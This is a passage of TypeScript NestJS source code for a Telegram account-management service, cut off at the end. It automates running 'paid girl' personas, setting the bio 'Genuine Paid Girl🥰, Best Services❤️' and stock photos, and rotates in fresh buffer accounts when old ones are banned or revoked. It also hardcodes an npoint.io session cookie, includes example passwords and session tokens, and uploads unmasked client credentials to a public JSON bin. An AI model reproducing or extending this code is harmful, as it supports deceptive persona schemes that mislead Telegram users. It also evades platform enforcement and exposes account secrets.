}\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { Client, ClientSchema } from './schemas/client.schema';\r\nimport { ClientService } from './client.service';\r\nimport { ClientController } from './client.controller';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { NpointModule } from '../n-point/npoint.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\r\n    forwardRef(()=>TelegramModule),\r\n    forwardRef(()=>BufferClientModule),\r\n    forwardRef(()=>UsersModule),\r\n    forwardRef(()=>ArchivedClientModule),\r\n    NpointModule\r\n  ],\r\n  controllers: [ClientController],\r\n  providers: [ClientService],\r\n  exports: [ClientService]\r\n})\r\nexport class ClientModule { }\r\n","import { TelegramService } from './../Telegram/Telegram.service';\r\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef, Query } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { Client, ClientDocument } from './schemas/client.schema';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\r\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { UsersService } from '../users/users.service';\r\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\r\nimport { areJsonsNotSame, contains, fetchNumbersFromString, fetchWithTimeout, mapToJson, parseError, ppplbot, toBoolean } from '../../utils';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\r\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\r\nimport * as path from 'path';\r\nimport { CloudinaryService } from '../../cloudinary';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { NpointService } from '../n-point/npoint.service';\r\nimport axios from 'axios';\r\nlet settingupClient = Date.now() - 250000;\r\n@Injectable()\r\nexport class ClientService {\r\n    private clientsMap: Map<string, Client> = new Map();\r\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\r\n        @Inject(forwardRef(() => TelegramService))\r\n        private telegramService: TelegramService,\r\n        @Inject(forwardRef(() => BufferClientService))\r\n        private bufferClientService: BufferClientService,\r\n        @Inject(forwardRef(() => UsersService))\r\n        private usersService: UsersService,\r\n        @Inject(forwardRef(() => ArchivedClientService))\r\n        private archivedClientService: ArchivedClientService,\r\n        private npointSerive: NpointService\r\n    ) {\r\n        setInterval(async () => {\r\n            await this.refreshMap();\r\n        }, 5 * 60 * 1000);\r\n    }\r\n\r\n    async checkNpoint() {\r\n        const clients = (await axios.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;\r\n        for (const client in clients) {\r\n            const existingClient = await this.findOne(client, false);\r\n            if (areJsonsNotSame(existingClient, clients[client])) {\r\n                await this.findAll();\r\n                const clientData = mapToJson(this.clientsMap)\r\n                await this.npointSerive.updateDocument(\"7c2682f37bb93ef486ba\", clientData)\r\n                const maskedCls = {};\r\n                for (const client in clientData) {\r\n                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];\r\n                    maskedCls[client] = maskedClient\r\n                }\r\n                await this.npointSerive.updateDocument(\"f0d1e44d82893490bbde\", maskedCls)\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    async create(createClientDto: CreateClientDto): Promise<Client> {\r\n        const createdUser = new this.clientModel(createClientDto);\r\n        return createdUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<Client[]> {\r\n        const clientMapLength = this.clientsMap.size\r\n        if (clientMapLength < 20) {\r\n            const results: Client[] = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean()\r\n            for (const client of results) {\r\n                this.clientsMap.set(client.clientId, client)\r\n            }\r\n            console.log(\"Refreshed Clients\")\r\n            return results\r\n        } else {\r\n            return Array.from(this.clientsMap.values())\r\n        }\r\n    }\r\n\r\n    async findAllMasked(query?: SearchClientDto) {\r\n        const allClients = await this.findAll()\r\n        const filteredClients = query\r\n            ? allClients.filter(client => {\r\n                return Object.keys(query).every(key => client[key] === query[key]);\r\n            })\r\n            : allClients;\r\n        const results = filteredClients.map(client => {\r\n            const { session, mobile, password, promoteMobile, ...maskedClient } = client;\r\n            return maskedClient;\r\n        });\r\n        return results;\r\n    }\r\n\r\n    async refreshMap() {\r\n        console.log(\"Refreshed Clients\")\r\n        this.clientsMap.clear();\r\n    }\r\n\r\n    async findOne(clientId: string, throwErr: boolean = true): Promise<Client> {\r\n        const client = this.clientsMap.get(clientId)\r\n        if (client) {\r\n            return client;\r\n        } else {\r\n            const user = (await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).exec())?.toJSON();\r\n            this.clientsMap.set(clientId, user);\r\n            if (!user && throwErr) {\r\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\r\n            }\r\n            return user;\r\n        }\r\n    }\r\n\r\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\r\n        delete updateClientDto['_id']\r\n        if ((<any>updateClientDto)._doc) {\r\n            delete (<any>updateClientDto)._doc['_id']\r\n        }\r\n        await fetchWithTimeout(`${ppplbot()}&text=Updating the Existing client: ${clientId}`);\r\n        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\r\n        }\r\n        this.clientsMap.set(clientId, updatedUser);\r\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\r\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\r\n        console.log(\"Refreshed Maps\")\r\n        return updatedUser;\r\n    }\r\n\r\n    async remove(clientId: string): Promise<Client> {\r\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\r\n        if (!deletedUser) {\r\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\r\n        }\r\n        return deletedUser;\r\n    }\r\n\r\n    async search(filter: any): Promise<Client[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.clientModel.find(filter).exec();\r\n    }\r\n\r\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\r\n        console.log(`Received New Client Request for - ${clientId}`)\r\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\r\n            settingupClient = Date.now();\r\n            const existingClient = await this.findOne(clientId);\r\n            const existingClientMobile = existingClient.mobile\r\n            await fetchWithTimeout(`${ppplbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\r\n            console.log(setupClientQueryDto);\r\n            await this.telegramService.disconnectAll();\r\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\r\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\r\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\r\n            try {\r\n                if (newBufferClient) {\r\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\r\n\r\n                    await this.telegramService.createClient(newBufferClient.mobile);\r\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\r\n                    await this.telegramService.deleteClient(newBufferClient.mobile)\r\n                    await this.updateClientSession(newSession)\r\n                } else {\r\n                    await fetchWithTimeout(`${ppplbot()}&text=Buffer Clients not available`);\r\n                    console.log(\"Buffer Clients not available\")\r\n                }\r\n\r\n                // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\r\n                // if (archivedClient) {\r\n                //     await fetchWithTimeout(`${ppplbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\r\n                //     await this.updateClientSession(archivedClient.session)\r\n                // } else {\r\n                //     await this.telegramService.createClient(newBufferClient.mobile, false, true);\r\n                //     await this.generateNewSession(newBufferClient.mobile)\r\n                // }\r\n            } catch (error) {\r\n                parseError(error);\r\n                await this.telegramService.deleteClient(newBufferClient.mobile);\r\n                console.log(\"Removing buffer as error\")\r\n                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\r\n                this.telegramService.setActiveClientSetup(undefined)\r\n            }\r\n        } else {\r\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\r\n        }\r\n    }\r\n\r\n    async updateClientSession(newSession: string) {\r\n        try {\r\n            const setup = this.telegramService.getActiveClientSetup();\r\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\r\n            await this.telegramService.disconnectAll();\r\n            await sleep(2000)\r\n            let updatedUsername;\r\n            await this.telegramService.createClient(newMobile, false, true);\r\n            const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\r\n            const userCaps = username[0].toUpperCase() + username.slice(1);\r\n            let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId)\r\n            updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\r\n            await fetchWithTimeout(`${ppplbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\r\n            await this.telegramService.deleteClient(newMobile);\r\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\r\n            const existingClient = await this.findOne(clientId);\r\n            this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\r\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\r\n            await this.bufferClientService.remove(newMobile);\r\n            setTimeout(async () => {\r\n                await this.updateClient(clientId);\r\n            }, 10000);\r\n\r\n            try {\r\n                if (existingClientUser) {\r\n                    try {\r\n                        if (toBoolean(formalities)) {\r\n                            await this.telegramService.createClient(existingMobile, false, true);\r\n                            console.log(\"Started Formalities\");\r\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\r\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\r\n                            await this.telegramService.updateUsername(existingMobile, '');\r\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\r\n                            console.log(\"Formalities finished\");\r\n                            await this.telegramService.deleteClient(existingMobile);\r\n                            await fetchWithTimeout(`${ppplbot()}&text=Formalities finished`);\r\n                        } else {\r\n                            console.log(\"Formalities skipped\")\r\n                        }\r\n                        if (archiveOld) {\r\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\r\n                            const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\r\n                                mobile: existingMobile,\r\n                                availableDate,\r\n                                session: existingClientUser.session,\r\n                                tgId: existingClientUser.tgId,\r\n                                channels: 170\r\n                            }\r\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\r\n                            // await this.archivedClientService.update(existingMobile, existingClient);\r\n                            console.log(\"client Archived: \", updatedBufferClient);\r\n                            await fetchWithTimeout(`${ppplbot()}&text=Client Archived`);\r\n                        } else {\r\n                            console.log(\"Client Archive Skipped\")\r\n                            await fetchWithTimeout(`${ppplbot()}&text=Client Archive Skipped`);\r\n                        }\r\n                    } catch (error) {\r\n                        console.log(\"Cannot Archive Old Client\");\r\n                        const errorDetails = parseError(error);\r\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\r\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\r\n                            await this.bufferClientService.remove(existingClientUser.mobile);\r\n                            await this.archivedClientService.remove(existingClientUser.mobile);\r\n                        } else {\r\n                            console.log('Not Deleting user');\r\n                        }\r\n                    }\r\n                }\r\n            } catch (error) {\r\n                parseError(error);\r\n            }\r\n            this.telegramService.setActiveClientSetup(undefined)\r\n\r\n            console.log(\"Update finished Exitting Exiiting TG Service\");\r\n            await fetchWithTimeout(`${ppplbot()}&text=Update finished`);\r\n            await this.telegramService.disconnectAll();\r\n\r\n        } catch (e) {\r\n            parseError(e);\r\n            this.telegramService.setActiveClientSetup(undefined)\r\n        }\r\n    }\r\n\r\n    async updateClient(clientId: string) {\r\n        const client = await this.findOne(clientId);\r\n        try {\r\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\r\n            const telegramClient = await this.telegramService.createClient(client.mobile, true, false);\r\n            await sleep(2000)\r\n            const me = await telegramClient.getMe();\r\n            if (me.username !== client.username || !me.username.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\r\n                const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\r\n                const userCaps = username[0].toUpperCase() + username.slice(1);\r\n                let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId);\r\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\r\n                await this.update(client.clientId, { username: updatedUsername })\r\n            }\r\n            await sleep(2000)\r\n            if (me.firstName !== client.name) {\r\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl🥰, Best Services❤️\");\r\n            }\r\n            await sleep(3000)\r\n            await telegramClient.deleteProfilePhotos();\r\n            await sleep(3000)\r\n            await telegramClient.updatePrivacy();\r\n            await sleep(3000)\r\n            const rootPath = process.cwd();\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\r\n            await sleep(3000);\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\r\n            await sleep(3000);\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\r\n            await sleep(2000);\r\n            await this.telegramService.deleteClient(client.mobile)\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n\r\n\r\n    async updateClients() {\r\n        const clients = await this.findAll();\r\n        for (const client of clients) {\r\n            await this.updateClient(client.clientId)\r\n        }\r\n    }\r\n\r\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\r\n        try {\r\n            console.log(\"String Generation started\");\r\n            await fetchWithTimeout(`${ppplbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\r\n            await sleep(1000);\r\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\r\n            if (response) {\r\n                console.log(`Code Sent successfully`, response.data);\r\n                await fetchWithTimeout(`${ppplbot()}&text=Code Sent successfully`);\r\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\r\n            } else {\r\n                await fetchWithTimeout(`${ppplbot()}&text=Failed to send Code`);\r\n                console.log(\"Failed to send Code\", response);\r\n                if (attempt < 2) {\r\n                    await sleep(8000);\r\n                    await this.generateNewSession(phoneNumber, attempt + 1);\r\n                }\r\n            }\r\n        } catch (error) {\r\n            console.log(error);\r\n            if (attempt < 2) {\r\n                await sleep(8000);\r\n                await this.generateNewSession(phoneNumber, attempt + 1);\r\n            }\r\n        }\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\r\n        try {\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.clientModel.find(query);\r\n\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\r\n        return this.clientModel.findOneAndUpdate(\r\n            { clientId }, // Filter by clientId\r\n            { $addToSet: { promoteMobile: mobileNumber } }, // Add only if it doesn't already exist\r\n            { new: true } // Return the updated document\r\n        ).exec();\r\n    }\r\n\r\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\r\n        return this.clientModel.findOneAndUpdate(\r\n            { clientId }, // Filter by clientId\r\n            { $pull: { promoteMobile: mobileNumber } }, // Remove the specified number\r\n            { new: true } // Return the updated document\r\n        ).exec();\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateClientDto {\r\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\r\n    readonly channelLink: string;\r\n\r\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\r\n    readonly dbcoll: string;\r\n\r\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\r\n    readonly link: string;\r\n\r\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\r\n    readonly name: string;\r\n\r\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\r\n    readonly mobile: string;\r\n\r\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\r\n    readonly password: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\r\n    readonly repl: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\r\n    readonly promoteRepl: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\r\n    readonly session: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\r\n    readonly username: string;\r\n\r\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\r\n    readonly clientId: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\r\n    readonly deployKey: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\r\n    readonly mainAccount: string;\r\n\r\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\r\n    readonly product: string;\r\n\r\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] })\r\n    readonly promoteMobile?: string[];\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams } from 'class-transformer';\r\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\r\n\r\nexport class SearchClientDto {\r\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    @IsOptional()\r\n    @IsString()\r\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\r\n    clientId?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Database collection name' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    @IsOptional()\r\n    @IsString()\r\n    dbcoll?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    channelLink?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    link?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Name of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    name?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\r\n    number?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Password of the client' })\r\n    @IsOptional()\r\n    @IsString()\r\n    password?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    repl?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    promoteRepl?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    clientName?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    deployKey?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Main account of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    @IsOptional()\r\n    @IsString()\r\n    mainAccount?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    product?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Promote mobile numbers of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.map((v: string) => v?.trim()))\r\n    @IsOptional()\r\n    @IsArray()\r\n    @ArrayNotEmpty({ message: 'Promote mobile numbers must not be empty if provided' })\r\n    @Matches(/^\\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' })\r\n    promoteMobile?: string[];\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateClientDto } from './create-client.dto';\r\n\r\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type ClientDocument = Client & Document;\r\n\r\n@Schema({\r\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class Client {\r\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\r\n    @Prop({ required: true })\r\n    channelLink: string;\r\n\r\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\r\n    @Prop({ required: true })\r\n    dbcoll: string;\r\n\r\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\r\n    @Prop({ required: true })\r\n    link: string;\r\n\r\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\r\n    @Prop({ required: true })\r\n    name: string;\r\n\r\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\r\n    @Prop({ required: true })\r\n    mobile: string;\r\n\r\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\r\n    @Prop({ required: true })\r\n    password: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\r\n    @Prop({ required: true })\r\n    repl: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\r\n    @Prop({ required: true })\r\n    promoteRepl: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\r\n    @Prop({ required: true })\r\n    session: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\r\n    @Prop({ required: true })\r\n    username: string;\r\n\r\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\r\n    @Prop({ required: true })\r\n    clientId: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\r\n    @Prop({ required: true })\r\n    deployKey: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\r\n    @Prop({ required: true })\r\n    mainAccount: string;\r\n\r\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\r\n    @Prop({ required: true })\r\n    product: string;\r\n\r\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user' })\r\n    @Prop({ required: false, type: [String] })\r\n    promoteMobile: string[];\r\n}\r\n\r\nexport const ClientSchema = SchemaFactory.createForClass(Client);\r\n","import {\r\n    Controller,\r\n    Get,\r\n    Post,\r\n    Put,\r\n    Param,\r\n    Body,\r\n    HttpException,\r\n    HttpStatus,\r\n  } from '@nestjs/common';\r\n  import { NpointService } from './npoint.service';\r\n  import {\r\n    ApiTags,\r\n    ApiOperation,\r\n    ApiParam,\r\n    ApiBody,\r\n    ApiResponse,\r\n  } from '@nestjs/swagger';\r\n  \r\n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\r\n  @Controller('npoint')\r\n  export class NpointController {\r\n    constructor(private readonly npointService: NpointService) {}\r\n  \r\n    @Get('documents/:id')\r\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\r\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'Document fetched successfully',\r\n    })\r\n    @ApiResponse({ status: 404, description: 'Document not found' })\r\n    async fetchDocument(@Param('id') id: string) {\r\n      try {\r\n        return await this.npointService.fetchDocument(id);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n      }\r\n    }\r\n  \r\n    @Post('documents')\r\n    @ApiOperation({ summary: 'Post a new document' })\r\n    @ApiBody({\r\n      description: 'The document to post',\r\n      schema: {\r\n        example: {\r\n          title: 'My Document',\r\n          content: 'This is the content of the document.',\r\n        },\r\n      },\r\n    })\r\n    @ApiResponse({\r\n      status: 201,\r\n      description: 'Document posted successfully',\r\n    })\r\n    @ApiResponse({ status: 400, description: 'Invalid input' })\r\n    async postDocument(@Body() document: any) {\r\n      try {\r\n        return await this.npointService.postDocument(document);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n      }\r\n    }\r\n\r\n    @Get('documents')\r\n    @ApiOperation({ summary: 'Fetch all documents' })\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'List of all documents fetched successfully',\r\n    })\r\n    @ApiResponse({ status: 500, description: 'Internal server error' })\r\n    async fetchAllDocuments() {\r\n      try {\r\n        return await this.npointService.fetchAllDocuments();\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n      }\r\n    }  \r\n  \r\n    @Put('documents/:id')\r\n    @ApiOperation({ summary: 'Update a document by ID' })\r\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\r\n    @ApiBody({\r\n      description: 'The updated document',\r\n      schema: {\r\n        example: {\r\n          title: 'Updated Document',\r\n          content: 'This is the updated content of the document.',\r\n        },\r\n      },\r\n    })\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'Document updated successfully',\r\n    })\r\n    @ApiResponse({ status: 404, description: 'Document not found' })\r\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\r\n      try {\r\n        return await this.npointService.updateDocument(id, updatedDocument);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n      }\r\n    }\r\n  }","import { Module } from '@nestjs/common';\r\nimport { NpointService } from './npoint.service';\r\nimport { NpointController } from './npoint.controller';\r\n\r\n@Module({\r\n  controllers: [NpointController],\r\n  providers: [NpointService],\r\n  exports: [NpointService]\r\n})\r\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\r\nimport axios from 'axios';\r\n\r\n@Injectable()\r\nexport class NpointService {\r\n    private readonly logger = new Logger(NpointService.name);\r\n    private csrfToken: string | null = null;\r\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\r\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\r\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\r\n\r\n    // Method to fetch CSRF token from the sign-in API\r\n    private async fetchCsrfToken(): Promise<string> {\r\n        